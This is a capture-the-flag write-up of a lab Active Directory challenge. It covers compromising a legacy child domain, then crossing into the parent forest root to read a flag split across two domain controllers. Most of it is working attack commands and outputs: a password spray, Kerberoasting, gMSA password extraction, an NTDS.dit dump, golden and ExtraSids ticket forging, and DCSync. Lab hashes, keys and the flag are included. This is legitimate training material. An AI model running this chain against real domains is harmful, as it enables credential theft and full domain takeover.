# M&A

**Category:** active directory · **Points:** 114 · **Solves:** 54 · **Author:** NeffIsBack & Steffen

## Challenge

> Velocity acquired a smaller company and bolted its old domain onto the new one. […]
> On every Administrator Desktop lies something valuable!

No handout: instance-only. The instance page hands out a WireGuard config that puts you on the
`10.244.0.0/24` lab network, and asks you to add both servers to `/etc/hosts`. Two DCs:

| host | role | domain |
|---|---|---|
| `DC-NEW` | forest root | `VELOCITY.HACKLU` (parent) |
| `DC-OLD` | legacy child | `OLD.VELOCITY.HACKLU` (child) |

"On every Administrator Desktop" is literal: the flag is **split in half**, one file on each DC, and
neither half validates on its own. So the goal is Domain Admin on *both* domains.

## TL;DR

Own the legacy child (`svc_test:svc_test` → Kerberoast `svc_granite_sync:Granite00` → parent gMSA
`svc_backup_gmsa$` → parent `Backup$` → child `NTDS.dit` → child `krbtgt`), read the first half with
a child golden ticket, then **cross the trust with an intra-forest ExtraSids ticket** carrying the
parent's Enterprise Admins SID, DCSync the parent `Administrator`, read the second half. The trust
looks hardened until you check `trustAttributes`: it is `0x20` (`WITHIN_FOREST`) with **no** `0x4`
(`QUARANTINED_DOMAIN`), so the parent honours forged `ExtraSids`.

## Files

There is no handout. `solve.py` in this directory holds the three helpers used below:

```
python3 solve.py read --host DC-OLD.old.velocity.hacklu --domain old.velocity.hacklu --dc-ip 10.244.0.20
python3 solve.py gmsa <hex|base64 msDS-ManagedPassword>
python3 solve.py assemble
```

Tools: `wireguard-tools`, `impacket` (`getTGT.py`, `getST.py`, `GetUserSPNs.py`, `ticketer.py`,
`secretsdump.py`, `smbclient.py`), `ldap-utils`, `hashcat`. NTLM is refused on both DCs
(`STATUS_NOT_SUPPORTED`), so every authentication below is Kerberos.

## Setup

```bash
wg-quick up ./wg.conf          # config from the instance page
```

The config's comments carry the two server addresses and sample host lines (IPs are per instance):

```
10.244.0.10 DC-NEW.velocity.hacklu velocity.hacklu
10.244.0.20 DC-OLD.old.velocity.hacklu old.velocity.hacklu
```

## Analysis

### The trust

The child's trust object on the parent carries

```
trustDirection:   3     (bidirectional)
trustType:        2     (uplevel / AD)
trustAttributes: 32     (0x20 TRUST_ATTRIBUTE_WITHIN_FOREST)
```

`0x4` (`TRUST_ATTRIBUTE_QUARANTINED_DOMAIN`, i.e. SID filtering) is **not** set, and neither is
`0x8`. This is an ordinary parent/child pair inside one forest, where a cross-realm PAC may carry
`ExtraSids` that are not local to the resource domain. So a *child* golden ticket with the
parent's Enterprise Admins SID added is accepted by the parent's KDC and its SIDs land in the
parent's access token.

The SIDs, read from the dumped objects (all 41 parent objects agree):

```
child  domain : S-1-5-21-976573591-227444304-1123500008
parent domain : S-1-5-21-274105150-4017454061-1646591600
parent EA     : S-1-5-21-274105150-4017454061-1646591600-519
```

Decoding the SID from an artifact instead of assuming it matters: a wrong SID and a filtered trust
are indistinguishable by symptom (extra SIDs simply absent, every LDAP write
`insufficientAccessRights … problem 4003`, `C$` `0xC0000022`), and only one of them is a dead end.

### Step 1 — foothold in the child domain

The child DC allows anonymous SAMR, and its password policy is minimal (minimum length 1, no
lockout), which invites a `user = password` spray over the 28 accounts:

```bash
rpcclient -U "" -N 10.244.0.20 -c enumdomusers \
    | sed -n 's/^user:\[\([^]]*\)\].*/\1/p' > users.txt
while read -r u; do
  KRB5CCNAME=/tmp/t.ccache getTGT.py -dc-ip 10.244.0.20 "old.velocity.hacklu/$u:$u" \
      >/dev/null 2>&1 && echo "hit $u:$u"
done < users.txt                      # hit svc_test:svc_test
```

`svc_test` is a plain user (a full ACL scan finds no write, DACL, `ForceChangePassword` or DCSync
right anywhere), so the next move is a service account.

### Step 2 — Kerberoast

`svc_granite_sync` has an SPN and the description *"Legacy Granite backup sync account — TEMPORARY,
remove after migration (2021)"*. Its TGS comes back as RC4 (etype 23), the cheap-to-crack type:

```bash
GetUserSPNs.py -dc-ip 10.244.0.20 -request -outputfile tgs.txt \
    old.velocity.hacklu/svc_test:svc_test
head -c 120 tgs.txt
# $krb5tgs$23$*svc_granite_sync$OLD.VELOCITY.HACKLU$old.velocity.hacklu/svc_granite_sync*$83e1…
```

`hashcat -m 13100` with a themed wordlist plus a two-digit mask recovers `Granite00` (the
acquisition target in `Acquisition_Agreement_DRAFT.txt` is "Granite Industries"). The NT hash
`f2275c5048239a3d016e1ca3e67122fe` in the later dump confirms the password.

### Step 3 — a parent gMSA that the child may read

`svc_granite_sync` is a member of the child group `Service Accounts`, which is granted
`msDS-ManagedPassword` read on the **parent** gMSA `svc_backup_gmsa$`. That crosses the trust: the
child TGT is used to request an LDAP service ticket for the parent DC, and the attribute is read
over LDAPS (plain LDAP is refused — signing is required):

```bash
getTGT.py -dc-ip 10.244.0.20 old.velocity.hacklu/svc_granite_sync:Granite00
KRB5CCNAME=svc_granite_sync.ccache getST.py -k -no-pass -dc-ip 10.244.0.20 \
    -spn ldap/DC-NEW.velocity.hacklu -outfile ldap.ccache \
    old.velocity.hacklu/svc_granite_sync
KRB5CCNAME=ldap.ccache ldapsearch -Y GSSAPI -H ldaps://DC-NEW.velocity.hacklu \
    -b 'DC=velocity,DC=hacklu' '(sAMAccountName=svc_backup_gmsa$)' msDS-ManagedPassword
```

`msDS-ManagedPassword` is a `GMSA` struct, not a string: at offset 8 a little-endian `uint16` gives
the start of the current password, at 12 the end, and the password is UTF-16LE with a trailing NUL.
The NT hash is the MD4 of the password bytes without that NUL:

```
offset 16  end 274  ->  NT hash 9e5ec51289d2b5e3477114fd2361aae4
```

### Step 4 — the parent `Backup$` share

The gMSA's NT hash is enough for a ccache
(`getTGT.py -dc-ip 10.244.0.10 -hashes :<nt> 'velocity.hacklu/svc_backup_gmsa$'`), and that account
can read the parent share `\\DC-NEW\Backup$` — an export of the **child** database:

```
\Export\NTDS.dit                  33554432
\Export\SYSTEM                    14155776
\FileServer\Salary_List_2025.csv       142
\FileServer\Acquisition_Agreement_DRAFT.txt 143
```

The share is read-only — every write attempt, including `C$` and `ADMIN$`, returns `0xC0000022` —
but read access is all that is needed:

```bash
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
# [*] Target system bootKey: 0xf8b8e7054ad8b2ae2243856f09584647
# [*] PEK # 0 found and decrypted: 3219bfa1cffec4d47eeaf0cbc88506f0
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e9fa231d054b9571977618d77caa561b:::
# krbtgt:aes256-cts-hmac-sha1-96:6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89
```

The child `krbtgt` AES256 key — `6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89` —
is Domain Admin in the child, and it is the same on every deployment of this lab.

### Step 5 — child Domain Admin, first half

```bash
ticketer.py -aesKey $CHILD_KRBTGT_AES -domain-sid S-1-5-21-976573591-227444304-1123500008 \
    -domain old.velocity.hacklu -dc-ip 10.244.0.20 Administrator
KRB5CCNAME=Administrator.ccache python3 solve.py read \
    --host DC-OLD.old.velocity.hacklu --domain old.velocity.hacklu --dc-ip 10.244.0.20
# bytes  : 46
# hex    : fffe66006c00610067007b006d003000760033005f0066003400730074005f0062007200330034006b000d000a00
# decoded: 'flag{m0v3_f4st_br34k'
```

`ticketer.py`'s default group list includes `Domain Admins` (512), and only the AES key plus the
domain SID are needed — no password, no NTLM.

### Step 6 — crossing into the parent, second half

Same forge, one extra SID: the parent's Enterprise Admins (`-519`). The ticket is still signed with
the **child** `krbtgt`, so the client first asks the child KDC for the cross-realm referral
`krbtgt/VELOCITY.HACKLU`, and the parent KDC then issues the service ticket with that SID in the
PAC. That only works because both domains share a forest and SID filtering is off:

```bash
PARENT_SID=S-1-5-21-274105150-4017454061-1646591600
ticketer.py -aesKey $CHILD_KRBTGT_AES -domain-sid S-1-5-21-976573591-227444304-1123500008 \
    -domain old.velocity.hacklu -dc-ip 10.244.0.20 -extra-sid ${PARENT_SID}-519 Administrator
KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass -target-ip 10.244.0.10 \
    -just-dc-user 'velocity\Administrator' \
    old.velocity.hacklu/Administrator@DC-NEW.velocity.hacklu
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:f705f9d69f37aa2d5c3ef1c821d691ce:::
# Administrator:aes256-cts-hmac-sha1-96:7b95391d66fc6c38917de3db7f45ca4ce7d2d2f374d7e606aa820f4d7b99dd0a
```

Enterprise Admins carries `DS-Replication-Get-Changes(-All)` on the parent domain, which is what
DCSync needs. From there, impersonate the real parent Administrator with the recovered AES key:

```bash
getTGT.py -aesKey 7b95391d66fc6c38917de3db7f45ca4ce7d2d2f374d7e606aa820f4d7b99dd0a \
    velocity.hacklu/Administrator -dc-ip 10.244.0.10
KRB5CCNAME=Administrator.ccache python3 solve.py read \
    --host DC-NEW.velocity.hacklu --domain velocity.hacklu --dc-ip 10.244.0.10
# bytes  : 48
# hex    : fffe5f007400680033005f006600300072003300730074005f00380039006100370031006600390067007d000d000a00
# decoded: '_th3_f0r3st_89a71f9g}'
```

Both files are UTF-16LE with a BOM and CRLF, so they are concatenated as decoded text: the second
half starts with `_`, and its BOM is not part of the flag.

## Solution

The six steps are executed in order; the parent DCSync needs the ExtraSids ticket, and the final
`getTGT.py` overwrites `Administrator.ccache`, so re-export `KRB5CCNAME` before each read.

Offline reassembly of the two captured halves (`solve.py assemble` does this for you):

```python
>>> b1 = bytes.fromhex('fffe66006c00610067007b006d003000760033005f0066003400730074005f0062007200330034006b000d000a00')
>>> b2 = bytes.fromhex('fffe5f007400680033005f006600300072003300730074005f00380039006100370031006600390067007d000d000a00')
>>> (b1.decode('utf-16').strip() + b2.decode('utf-16').strip())
'flag{m0v3_f4st_br34k_th3_f0r3st_89a71f9g}'
```

## Flag

```
flag{m0v3_f4st_br34k_th3_f0r3st_89a71f9g}
```

## Notes

- The decisive detail is `trustAttributes`: `0x20` without `0x4` means the parent trusts SIDs from
  the child's PAC, while `0x4` would strip them silently. Decode the parent SID from the dump.
- No parent credential is needed in the crossing: the child `krbtgt` plus the intra-forest trust
  suffices, and the inter-realm key (`VELOCITY$`, RID 3101) is not required either.
- Reads are byte-exact: `solve.py` prints raw hex, the only way to be sure about BOM and CRLF.
- The parent offers little else — no ADCS, no writable ACLs, no writable share — so coercion and
  certificate-template paths are dead ends; the intended path is the trust itself.
- Steps 1–4 use stock tooling (spray loop, `GetUserSPNs.py`, `getST.py`+`ldapsearch`, `solve.py
  gmsa`); steps 5–6 are the literal commands that produced the outputs shown.
